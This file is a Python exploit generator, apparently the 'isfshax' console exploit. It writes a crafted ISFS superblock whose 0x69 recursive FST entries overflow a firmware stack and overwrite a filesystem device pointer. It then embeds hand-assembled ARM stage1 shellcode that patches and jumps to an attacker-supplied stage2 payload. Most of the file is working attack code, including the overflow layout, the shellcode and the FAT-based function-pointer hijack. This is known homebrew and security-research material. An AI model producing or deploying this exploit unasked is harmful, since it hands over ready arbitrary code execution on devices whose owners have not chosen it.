#!/usr/bin/env python3
import struct
import sys
from Crypto.Hash import SHA1

stage2file = sys.argv[1]
outfile = sys.argv[2]

stage2 = bytearray(open(stage2file, "rb").read())

# create superblock header
header = struct.pack(">III",
    0x53465321, # magic
    0xfffffffe, # generation
    0x00000000  # field_0x8
)

# mark all blocks as bad
fat = [0xFFFD] * 0x8000

# generate FST entries
def fstEntry(name, mode=2, attr=0, sub=0xFFFF, sib=0xFFFF, size=0, x1=0, uid=0, gid=0, x3=0):
    return struct.pack(">12sBBHHIHHHI", name.encode('ascii'), mode, attr, sub, sib, size, x1, uid, gid, x3)

# create FST root node
fst = fstEntry(name="/", sub=1)

# create /sys/config/system.xml
fst += fstEntry(name="sys", sub=2, sib=4)
fst += fstEntry(name="config", sub=3)
fst += fstEntry(name="system.xml", mode=0xC1, sub=0x7FFF, size=0x636)
fat[0x7FFF] = 0xFFFB # prevent infinite loop in ISFS stat

# ensure IOS detects this as a *very* broken
# superblock rather than trying to repair it
# by setting one file node sub to >0xFFFB
fst += fstEntry(name="ios.stop", mode=0xC1, sib=5, sub=0xFFFC, size=1)

# create 0x69 recursive entries to overflow the stack up
# to 0x0D40E240 and overwrite FLA's FS device pointer
# with the address of the superblock
for i in range(5+0, 5+0x68):
    fst += fstEntry(name="a", sub=(i+1))
fst += fstEntry(name="a")


# clear stage2 fake FST entries mode field at k*0x20 + 0xC,
# otherwise boot1 will clear the first bit of the size field
repairData = bytearray()

offs = 0x0C
while offs < len(stage2):
    if (len(repairData) & 0x1F) == 0x0C:
        repairData.append(0)  # skip FST mode field
    repairData.append(stage2[offs])
    stage2[offs] = 0
    offs += 0x20


# place stage1/repairData/stage2 at the end of the FST
superblockStart = 0x01f80000
superblockEnd = superblockStart + 0x40000
fstOffset = 0x1000c
fstStart = superblockStart + fstOffset
fstAreaSize = 6143 * 0x20

stage2FstOffset = (fstAreaSize  - len(stage2)) & ~0x1F
stage2Addr = fstStart + stage2FstOffset

repairDataFstOffset = (stage2FstOffset - len(repairData)) & ~0x1F
repairDataAddr = fstStart + repairDataFstOffset


# stage1 adds back the removed FST mode field bytes to stage2
stage1Code = [
    b"\xe2\x8f\x00\x2c", # +00       add r0, pc, #0x2C              @ get address of stage1 data
    b"\xe8\x90\x00\x07", # +04       ldmia r0, {r0, r1, r2}         @ load repairDataAddr, repairDataEnd, stage2Addr
    b"\xe2\x82\x50\x0c", # +08       add r5, r2, 0xC                @ compute address of first missing byte
    b"\x00\x00\x00\x00", # +0C                                      @ skip FST mode field
    b"\xe2\x00\x40\x1f", # +10 loop: and r4, r0, #0x1F              @ get last 5 bits of repair data ptr
    b"\xe4\xd0\x30\x01", # +14       ldrb r3, [r0], #1              @ load byte and increment repair data ptr
    b"\xe3\x54\x00\x18", # +18       cmp r4, #0x18                  @ ignore repair data when ptr ends with 0x18 (-> fst+0xC)
    b"\x14\xc5\x30\x20", # +1C       strbne r3, [r5], #0x20         @ otherwise write repair data to missing byte
    b"\xe1\x50\x00\x01", # +20       cmp r0, r1                     @ check if repair data finished
    b"\x12\x4f\xf0\x1c", # +24       bne loop (subne pc, pc, #0x1C) @ otherwise loop
    b"\xe1\x2f\xff\x12", # +28       bx r2                          @ jump to stage2
    b"\x00\x00\x00\x00", # +2C skip FST mode field
    b"\x00\x00\x00\x00", # +30 
]
stage1 = b"".join(stage1Code)
stage1 += struct.pack(">III", repairDataAddr, repairDataAddr + len(repairData), stage2Addr)

stage1FstOffset = (repairDataFstOffset - len(stage1)) & ~0x1F
stage1Addr = fstStart + stage1FstOffset


# append stage1/repairData/stage2 to the FST
if stage1FstOffset < len(fst):
    print("ERROR: insufficient superblock space for stage1")
    sys.exit(1)
print('(offs %#05x) %#08x -> stage1' % (fstOffset + stage1FstOffset, stage1Addr))

if repairDataFstOffset < len(fst):
    print("ERROR: insufficient superblock space for repair data")
    sys.exit(1)
print('(offs %#05x) %#08x -> repair data' % (fstOffset + repairDataFstOffset, repairDataAddr))

if stage2FstOffset < len(fst):
    print("ERROR: insufficient superblock space for stage2")
    sys.exit(1)
print('(offs %#05x) %#08x -> stage2' % (fstOffset + stage2FstOffset, stage2Addr))

fst += b"\x00" * (stage1FstOffset - len(fst))
fst += stage1
fst += b"\x00" * (repairDataFstOffset - len(fst))
fst += repairData
fst += b"\x00" * (stage2FstOffset - len(fst))
fst += stage2
fst += b"\x00" * (fstAreaSize - len(fst))


# write stage1 entrypoint to the first two FAT entries; after
# the stack overflow overwrites FLA's FS device pointer with
# the address of the superblock, they will be interpreted as
# as the structure's read() function pointer
fat[0] = stage1Addr >> 16
fat[1] = stage1Addr & 0xffff


# create superblock
superblock = header
superblock += struct.pack(">32768H", *fat)
superblock += fst
superblock += b"\x00" * 0x14

# write crafted superblock
f = open(outfile, "wb")
f.write(superblock)
f.close()

# write crafted superblock hash
h = SHA1.new(superblock)
f = open(outfile + ".sha", "wb")
f.write(h.digest())
f.close()

print("isfshax: written superblock to " + outfile)
